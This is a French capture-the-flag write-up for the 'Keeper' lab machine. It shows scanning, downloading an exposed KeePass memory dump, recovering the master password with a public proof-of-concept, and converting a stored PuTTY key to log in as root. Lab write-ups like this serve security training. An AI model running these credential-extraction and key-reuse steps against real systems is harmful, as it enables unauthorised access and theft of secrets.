  # Keeper

	echo "10.10.11.227 keeper.htb" >> /etc/hosts
	echo "10.10.11.227 tickets.keeper.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.227 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 10.10.11.227 -oN nmap.txt

	
Scans classiques.

	PORT STATE SERVICE VERSION  
	22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
	80/tcp open http nginx 1.18.0 (Ubuntu)  
	8000/tcp open http SimpleHTTPServer 0.6 (Python 3.10.12)

Le site du port 80 redirige vers http://tickets.keeper.htb/rt/ et cette page contient un formulaire de login.
</br>Le site du port 8000 renvoie un listing de fichiers très intéressants, dont le flag utilisateur, un fichier .kdbx et un dump KeePass notamment : 

	wget http://keeper.htb:8000/KeePassDumpFull.dmp
	wget http://keeper.htb:8000/passcodes.kdbx
	wget http://keeper.htb:8000/user.txt
    cat user.txt 

	strings KeePassDumpFull.dmp > dump.txt

Rien de pertinent dans le contenu du dump et impossible de cracker le .kdbx avec John mais il existe un autre moyen d'exploiter les fichiers .dmp pour d'anciennes versions de KeePass : https://github.com/CMEPW/keepass-dump-masterkey

	python poc.py KeePassDumpFull.dmp

On obtient un résultat étrange : 

	2023-08-27 20:29:45,057 [.] [main] Opened KeePassDumpFull.dmp
	Possible password: ●,dgr●d med fl●de
	Possible password: ●ldgr●d med fl●de
	Possible password: ●`dgr●d med fl●de
	Possible password: ●-dgr●d med fl●de
	Possible password: ●'dgr●d med fl●de
	Possible password: ●]dgr●d med fl●de
	Possible password: ●Adgr●d med fl●de
	Possible password: ●Idgr●d med fl●de
	Possible password: ●:dgr●d med fl●de
	Possible password: ●=dgr●d med fl●de
	Possible password: ●_dgr●d med fl●de
	Possible password: ●cdgr●d med fl●de
	Possible password: ●Mdgr●d med fl●de

En recopiant certains de ces résultats sur Google, je suis tombé sur le nom d'un dessert danois nommé **"rødgrød med fløde"** et cela a fonctionné comme mot de passe pour le KeePass. 

	keepassxc passcodes.kdbx

On trouve deux comptes qui ne servent pas à grand chose, mais également un fichier PPK pour root dans les notes. Il est possible de convertir ce fichier en clé privée classique.

Voir : https://superuser.com/questions/232362/how-to-convert-ppk-key-to-openssh-key-under-linux

	vim putty.ppk 
	puttygen putty.ppk -O private-openssh -o id_rsa
	chmod 600 id_rsa
	ssh -i id_rsa -l root 10.10.11.227
	cat /root/root.txt
